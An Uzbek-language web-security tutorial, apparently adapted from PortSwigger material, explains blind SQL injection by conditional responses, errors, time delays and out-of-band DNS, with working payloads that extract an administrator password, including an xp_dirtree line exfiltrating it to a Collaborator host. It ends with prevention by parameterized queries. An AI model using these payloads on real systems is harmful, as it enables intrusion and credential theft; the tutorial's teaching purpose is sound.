# Blind SQL ineksiya

Ushbu bo'limda biz **blind SQL ineksiya** nima ekanligini tasvirlaymiz, blind SQL ineksiyasi zaifliklarini topish va ulardan foydalanishning turli usullarini tushuntiramiz.

## <mark style="color:yellow;">Blind SQL ineksiya nima ?</mark> <a href="#blind-sql-injection-nima" id="blind-sql-injection-nima"></a>

**Blind SQL ineksiya** websaytda SQL ineksiyaga zaif bo'lsa sodir bo'ladi, lekin uning **HTTP** javoblarida tegishli SQL so'rov natijalari yoki ma'lumotlar bazasi xatolarining tafsilotlari mavjud emas.

Blind SQL ineksiya zaifliklarida, UNION hujumlari kabi ko'plab usullar samarali emas, chunki ular websayt javoblarida kiritilgan so'rov natijalarini ko'rish imkoniyatiga tayanadi. Ammo ruxsatsiz ma'lumotlarga kirish uchun blind SQL ineksiyadan hozirda ham foydalanish mumkin, ammo boshqa usullardan foydalanish ko'proq samara beradi.

## <mark style="color:yellow;">Shartli javoblarni ishga tushirish orqali blind SQL ineksiyadan foydalanish</mark> <a href="#shartli-javoblarni-ishga-tushirish-orqali-blind-sql-inektsiyasidan-foydalanish" id="shartli-javoblarni-ishga-tushirish-orqali-blind-sql-inektsiyasidan-foydalanish"></a>

Foydalanish tahlilini to'plash uchun **cookie** fayllaridan foydalanadigan websaytni tasavvur qiling. Saytga so'rovlar quyidagi kabi cookie sarlavhasini o'z ichiga oladi:

`Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4`

`TrackingId` cookie-faylini o'z ichiga olgan so'rov qayta ishlanganda, dastur bu SQL so'rovidan foydalangan holda ma'lum foydalanuvchi ekanligini aniqlaydi:

`SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'`

Ushbu so'rov SQL ineksiyaga qarshi himoyasiz, ammo so'rov natijalari foydalanuvchiga qaytarilmaydi. Biroq so'rov, ma'lumotlarni qaytarish yoki qaytarmasligiga qarab, dastur turlicha amal bajaradi. Agar ma'lumotlar qaytarilsa (Kuzatuv identifikatori yuborilganligi sababli), sahifada "Xush kelibsiz" xabari paydo bo'ladi.

Bu blind SQL ineksiyaning zaifligidan foydalanish va ineksiya qilingan holatga qarab turli xil javoblarni shartli ravishda ishga tushirish orqali ma'lumot olish uchun yetarli. Bu qanday ishlashini ko'rish uchun, birin-ketin quyidagi **TrackingId cookie** qiymatlarini o'z ichiga olgan ikkita so'rov yuborilgan deylik:

`…xyz' AND '1'='1 …xyz' AND '1'='2`

Ushbu qiymatlarning birinchisi so'rov natijalarini qaytarishiga olib keladi, chunki kiritilgan **AND '1'='1** sharti to'g'ri va shuning uchun "**Xush kelibsiz**" xabari ko'rsatiladi. Ammo, ikkinchi qiymat, so'rov hech qanday natija bermaydi, chunki kiritilgan shart noto'g'ri va shuning uchun "**Xush kelibsiz**" xabari ko'rsatilmaydi. Bu bizga har qanday ineksiya qilingan holatga javobni aniqlash imkonini beradi va shuning uchun bir vaqtning o'zida ma'lumotlarni birma bir ajratib olish imkonini beradi.

Masalan, **USERNAME** va **PASSWORD** ustunlari bo'lgan **USERS** deb nomlangan jadval va **Administrator** deb nomlangan foydalanuvchi bor deylik. Shunday qilib, biz parolni bir vaqtning o'zida bir belgidan sinab ko'rish uchun bir qator kirishlarni yuborish orqali ushbu foydalanuvchi uchun parolni aniqlashimiz mumkin.

Buning uchun biz quyidagi kiritishdan boshlaymiz:

```sql
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
```

Bu "Xush kelibsiz" xabarini qaytaradi, kiritilgan shart to'g'ri ekanligini va shuning uchun parolning birinchi belgisi m dan katta ekanligini ko'rsatadi.

So'ng, biz quyidagi ma'lumotlarni yuboramiz:

```sql
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
```

Bu "Xush kelibsiz" xabarini qaytarmaydi, kiritilgan shart noto'g'ri ekanligini va shuning uchun parolning birinchi belgisi t dan katta emasligini ko'rsatadi.

Ohirida, biz parolning birinchi belgisi **s** ekanligini tasdiqlovchi "**Qaytganingiz bilan**" xabarini qaytaradigan quyidagi ma'lumotni yuboramiz:

```sql
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
```

`Administrator` foydalanuvchisi uchun to'liq parolni muntazam ravishda aniqlash uchun ushbu jarayonni davom ettirishimiz mumkin.

**Eslatma**

`SUBSTRING`funksiyasi ba'zi ma'lumotlar bazasi bo'yicha `SUBSTR` deb nomlanadi.

{% hint style="warning" %}
<mark style="color:yellow;">**Lab:**</mark>** **<mark style="color:blue;">****</mark> [Shartli javoblar orqali Blind SQL ineksiya **≫**](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)****
{% endhint %}

## <mark style="color:yellow;">SQL xatolar orqali shartli javoblarni keltirib chiqarish</mark> <a href="#sql-xatolar-orqali-shartli-javoblarni-keltirib-chiqarish" id="sql-xatolar-orqali-shartli-javoblarni-keltirib-chiqarish"></a>

Bu safar oldingi misolga qaraganda, dastur bir xil SQL so'rovini bajarsada lekin so'rov ma'lumotlarni qaytarish yoki qaytarmasligiga qarab dastur turlicha amal bajarmaydi deb faraz qiling. Yuqoridagi usul ishlamaydi, chunki boshqa mantiqiy shartlarni kiritish sayt javoblarida farq qilmaydi.

Bunday holatda, ko'pincha SQL xatolarini shartli ravishda ishga tushirish orqali dasturni shartli javoblarni qaytarishga undash mumkin. Buning uchun so'rovni shunday o'zgartirish kerakki, u shart rost bo'lganda ma'lumotlar bazasi xatosini keltirib chiqaradi. Ko'pincha, ma'lumotlar bazasi tomonidan yuborilgan ishlov berilmagan xato, dasturning javobidagi tur xillikka olib keladi (masalan xatolik xabari), bu bizga kiritilgan holatning haqiqatini aniqlashga imkon beradi.

Bu qanday ishlashini ko'rish uchun, o'z navbatida quyidagi `TrackingId` cookie qiymatlarini o'z ichiga olgan ikkita so'rov yuborilgan deylik:

```plsql
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```

Ushbu payloaddlar shartni tekshirish uchun `CASE` kalit so'zidan foydalanadi va ifodaning to'g'ri yoki yo'qligiga qarab boshqa ifodani qaytaradi. Birinchi kiritishda `CASE` ifodasi “a” ga tenglanadi, bu xatolikka olib kelmaydi. Ikkinchi kiritishda u `1/0` ga tenglanadi, bu esa nolga bo'linish xatosini keltirib chiqaradi. Xato websaytning **HTTP** javobida farqga olib keladi deb faraz qilsak, biz kiritilgan shartning to'g'ri yoki noto'g'riligini aniqlash uchun bu farqdan foydalanishimiz mumkin.

Ushbu texnikadan foydalanib, biz bir vaqtning o'zida bitta belgini muntazam ravishda sinab ko'rish orqali ma'lumotlarni yuqorida tavsiflangan usulda olishimiz mumkin:

`xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a`

{% hint style="info" %}
**Eslatma:**

Shartli xatolarni keltirib chiqarishining turli usullari mavjud va turli xil usullar turli xil ma'lumotlar bazasida yaxshi ishlaydi.
{% endhint %}

{% hint style="warning" %}
&#x20;<mark style="color:blue;">****</mark>** **<mark style="color:yellow;">**Lab:**</mark> [Sharli holatlar orqali Blind SQL ineksiya hujumi **≫**](https://portswigger.net/web-security/sql-injection/blind)****
{% endhint %}

## <mark style="color:yellow;">Time delay (vaqtni sekinlashtirish) orqali blind SQL ineksiyadan foydalanish</mark> <a href="#time-delay-vaqtni-sekinlashtirish-orqali-blind-sql-ineksiyasidan-foydalanish" id="time-delay-vaqtni-sekinlashtirish-orqali-blind-sql-ineksiyasidan-foydalanish"></a>

Bu safar oldingi misolga qaraganda, dastur endi ma'lumotlar bazasi xatolarini ushlaydi va ularni to'g'ri boshqaradi deb faraz qilaylik. Ineksion SQL so'rovi bajarilganda ma'lumotlar bazasi xatosini ishga tushirish veb-sayt javobida hech qanday farqga olib kelmaydi, shuning uchun shartli xatolarni keltirib chiqarishning oldingi usuli ishlamaydi.

Bunday holatda, ko'pincha ineksiya qilingan holatga qarab atayin vaqtni sekinlashtirish orqali **Blind SQLi** zaifligidan foydalanish mumkin. SQL so'rovlari odatda dastur tomonidan sinxron ishlov berilganligi sababli, SQL so'rovining bajarilishini sekinlashtirish **HTTP** javobini ham sekinlashtiradi. Bu **HTTP** responsini olishdan oldin o'tgan vaqtga asoslanib, kiritilgan holatning tog'ri yoki noto'g'riligini aniqlashga imkon beradi.

**Time delay**ni ishga tushirish usullari, ishlatiladigan ma'lumotlar bazasi turiga juda xosdir. **Microsoft SQL Server**da buni sinab ko'rish va ifodaning to'g'ri yoki noto'g'riligia qarab sekinlatishni boshlash uchun quyidagi kabi **payload**dan foydalanish mumkin:

```sql
'; IF (1=2) WAITFOR DELAY '0:0:10'--
'; IF (1=1) WAITFOR DELAY '0:0:10'--
```

Ushbu SQL so'rovining birinchisi sekinlatishni keltirib chiqarmaydi, chunki `1=2` sharti noto'g'ri. Ikkinchi SQL so'rov 10 soniya sekinlashtirishni keltirib chiqaradi, chunki `1=2` sharti rost.

Ushbu usuldan foydalanib, biz bir vaqtning o'zida bitta belgini muntazam ravishda sinab ko'rish orqali ma'lumotlarni yuqorida tavsiflangan usulda olishimiz mumkin:

`'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--`

{% hint style="info" %}
**Eslatma:**

SQL so'rovlarida vaqtni kechiktirishning turli usullari bor va turli xil texnikalari hae xil ma'lumotlar bazasida qo'llaniladi.
{% endhint %}

{% hint style="warning" %}
<mark style="color:yellow;">**Lab:**</mark>** **<mark style="color:blue;">****</mark> [Time delaylar orqali SQL ineksiya **≫**](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays)****
{% endhint %}

{% hint style="warning" %}
<mark style="color:yellow;">**Lab:**</mark> [Vaqtni kechiktirish va malumotlarni olish uchun Blind SQL ineksiya hujumi **≫**](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval)****
{% endhint %}

## <mark style="color:yellow;">OAST texnikasidan foydalangan holda Blind SQL ineksiyadan foydalanish</mark> <a href="#oast-texnikasidan-foydalangan-holda-blind-sql-inektsiyasidan-foydalanish" id="oast-texnikasidan-foydalangan-holda-blind-sql-inektsiyasidan-foydalanish"></a>

Aytaylik, dastur bir xil SQL so'rovini bajaradi, lekin uni asinxron tarzda amalga oshiradi. Ilova foydalanuvchining so'rovini haqiqiy **thread**da qayta ishlashni davom ettiradi va **cookie**-fayllar yordamida SQL so'rovini bajarish uchun boshqa **thread**dan foydalanadi. So'rov hali ham SQL ineksiyaga zaif, ammo hozirgacha aytilgan usullardan hech biri ishlamaydi: Websaytning javobi so'rovning biron bir ma'lumotni qaytarishiga yoki ma'lumotlar bazasida xatolik yuzaga kelishiga yoki so'rovni bajarish uchun ketgan vaqtga bog'liq emas.

Bunday holatda, ko'pincha siz boshqaradigan tizimga OASTdan foydalanib **Blind SQL** ineksiya zaifligidan foydalanish mumkin. Avvalgidek, ular birma-bir ma'lumot olish uchun kiritilgan shart asosida shartli ravishda ishga tushirilishi mumkin. Bundan ham kuchlirog'i, ma'lumotlar to'g'ridan-to'g'ri tarmoq aro ta'sirining o'zida chiqarilishi mumkin.

Bu maqsadda turli xil tarmoq protokollaridan yuborish mumkin, lekin eng samarali **DNS** _(domen nomi xizmati)_ olib boradi. Buning sababi shundaki, juda ko'p ishlab chiqarish tarmoqlari **DNS** so'rovlarini bepul chiqarish imkonini beradi, chunki ular ishlab chiqarish tizimlarining normal ishlashi uchun zarurdir.

**OAST**dan foydalanishning eng oson va ishonchli usuli **Burp Collaborator**-dan foydalanishdir. Bu turli xil tarmoq xizmatlarining (jumladan, DNS) maxsus ilovalarini ta'minlovchi server bo'lib, zaif dasturga individual payladlarni etkazib berish va tarmoq o'zaro ta'siri qachon sodir bo'lishini ta'minlaydi.

DNS so'rovini ishga tushirish usullari ma'lumotlar bazasi turiga juda xosdir. Microsoft SQL Serverda ma'lum domenda DNS lookup uchun quyidagi kabi SQL so'rovdan foydalanish mumkin:

`'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--`

\*\*Bu ma'lumotlar bazasi quyidagi domenni qidirishga olib keladi: \*\*

`0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net`

Siz Burpsuitening Collabratori orqali **uniq subdomen** yaratishingiz va har qanday DNS qidiruvi bo'lganda tasdiqlash uchun **Collaborator server**iga so'rov o'tkazing.

{% hint style="warning" %}
<mark style="color:yellow;">**Lab:**</mark> [OAST o'zaro ta'siri orqali Blind SQL ineksiya hujumi **≫**](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band)****
{% endhint %}

OAST o'zaro tasirlarini ishga tushirish usulini tasdiqlaganingizdan so'ng, zaif dasturdan ma'lumotlarni olish uchun OAST kanalidan foydalanishingiz mumkin. Misol uchun:

`'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--`

Ushbu SQL so'rovi `Administrator` foydalanuvchisining parolini o'qiydi, **uniq Collaborator subdomen**ini qo'shadi va **DNS qidiruv**ini ishga tushiradi. Bu sizga olingan parolni ko'rish imkonini beruvchi quyidagi kabi **DNS** qidiruviga olib keladi: **S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net**

OAST usuli muvaffaqiyatga erishish ehtimoli va OAST kanali ichidagi ma'lumotlarni to'g'ridan-to'g'ri eksfiltratsiya qilish qobiliyati tufayli **Blind SQL** in'ektsiyasini aniqlash va undan foydalanishning juda kuchli usuli hisoblanadi.

{% hint style="warning" %}
<mark style="color:yellow;">**Lab:**</mark> [Out-of-band ma'lumotlar exfiltratsiyasi yordamida Blind SQL ineksiya hujumi **≫**](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration)****
{% endhint %}

## <mark style="color:yellow;">Blind SQL ineksiya hujumini qanday qilib oldini olish mumkin ?</mark> <a href="#blind-sql-ineksiya-hujumini-qanday-qilib-oldini-olish-mumkin" id="blind-sql-ineksiya-hujumini-qanday-qilib-oldini-olish-mumkin"></a>

**Blind SQL** ineksiya zaifliklarini topish va ulardan foydalanish uchun zarur bo'lgan usullar oddiy SQL ineksiyadan farqli va murakkabroq bo'lsada, SQL ineksiyaning oldini olish uchun zarur bo'lgan choralar zaiflik bor yoki yo'qligidan qat'iy nazar, bir xil bo'ladi.

Oddiy SQL ineksiyada bo'lgani kabi, parametrlangan so'rovlardan foydalanish orqali **Blind SQL** ineksiya hujumlarining oldini olish mumkin, bu esa foydalanuvchi kiritishiga mo'ljallangan SQL so'rovi tuzilishiga xalaqit bermasligini ta'minlaydi.
